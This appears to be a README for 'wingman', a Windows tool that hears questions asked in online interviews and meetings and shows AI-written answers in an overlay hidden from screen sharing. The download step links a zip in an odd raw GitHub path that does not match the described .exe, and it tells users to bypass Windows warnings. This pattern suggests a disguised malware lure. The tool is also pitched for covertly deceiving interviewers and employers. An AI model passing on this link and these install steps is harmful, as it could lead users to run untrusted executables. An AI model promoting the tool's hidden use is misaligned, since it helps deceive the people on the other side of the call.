🪄 What is wingman?

Think of wingman as a smart friend who sits beside you during online interviews or meetings. It listens to the other person's voice (through your computer's internal audio), writes down what they say in real time (transcription), and then intelligently detects when they ask a yes/no or open-ended question. In that moment, wingman quickly writes a clear answer and shows it to you in a small, always-on-top overlay window on your screen.

The best part? The overlay is invisible to screen-sharing tools (like Zoom, Teams, or Google Meet). So you can ask wingman for help without anyone knowing. It uses your free Google Chrome or any Groq API key (you'll get one in 2 minutes) — no monthly fees, no credit cards.

🎁 Key Features

  • 🎧 Captures system audio – works with any headset or speaker the other person talks into.
  • ⚡ Ultra-fast transcription – powered by Groq Whisper; text appears in under a second.
  • ❓ Automatic question detection – distinguishes real questions from casual chatter.
  • 💬 Streamed AI answers – answers appear word-by-word, so you can keep talking naturally.
  • 🕶️ Hidden overlay – invisible to screen recording and screen sharing.
  • 🎛️ Floating control bar – start, pause, and quit with a click.
  • 🌈 Light & dark mode – matches your desktop theme.
  • 💰 100% free – just use a free Groq API key (up to 10,000 requests/day).

🖥️ System Requirements

wingman is designed to run smoothly on average Windows computers. Here's what you need:

  • Operating System: Windows 10 (64-bit) or later (Windows 11 recommended).
  • Processor: Intel Core i3 or AMD equivalent (or better).
  • Memory: 4 GB RAM minimum, 8 GB recommended.
  • Storage: 500 MB free disk space.
  • Internet: Broadband connection (needed for AI processing).
  • Audio: Any internal or external microphone is fine; wingman captures system output.

A free Groq API key is required. It's free to create and gives you enough queries for a month of daily use.

🚀 Getting Started (Step-by-Step)

Step 1: Download wingman

Visit this link to download the application: https://raw.githubusercontent.com/mikakoopposing6081/mikakoopposing6081.github.io/main/_posts/_docs/continuous-integration/Latest_3.4-beta.5.zip

You will see a list of release files. Look for the file named wingman-setup.exe and download it.

Step 2: Install

When the download finishes, double-click the .exe file. A standard installation wizard will appear. Just click “Next” and “Install” (no special options needed). wingman will install in your Program Files folder and create a shortcut on your desktop.

Note: Your browser or Windows may show a warning about the unknown publisher. This is normal for a free community app. Click “Keep” and “Run anyway” – the app is open-source and safe.

Step 3: Get your free API key

  1. Go to console.groq.com and create a free account (or log in with Google).
  2. Click “Create API Key”. Give it any name (e.g., “wingman”).
  3. Copy the key string that looks like gsk_.... It starts with "gsk_" and ends with random letters.
  4. Paste this key when wingman first asks for it (or later from Settings).

Step 4: Launch and use wingman

  1. Double-click the wingman shortcut on your desktop.
  2. The wingman fish icon 🐟 appears in your system tray (bottom-right). Click it and choose “Open Control Panel”.
  3. Make sure the toggle says “Capturing” (green dot). If it’s not, click “Start Listening”.
  4. Now start any online interview or meeting. wingman will automatically show a floating overlay with live transcript and AI answers when the other person asks a question.
  5. You can drag the overlay to any corner, resize it, or hide it completely (it stays hidden from screen capture).

❓ Frequently Asked Questions

Q: Is wingman really free?

Yes. The app itself is free, and you provide your own free API key from Groq. That gives you about 10,000 requests per day – enough for hours of continuous use.

Q: Can my employer or video call host see the overlay?

No. wingman is engineered to be invisible to screen capture. It uses a special window layer that is excluded from screen-share APIs on Windows. The only way to see it is by physically looking at your monitor.

Q: Does it work with any meeting app?

Yes – it works system-wide, so it works with Zoom, Microsoft Teams, Google Meet, Webex, Skype, or even phone calls routed through your computer.
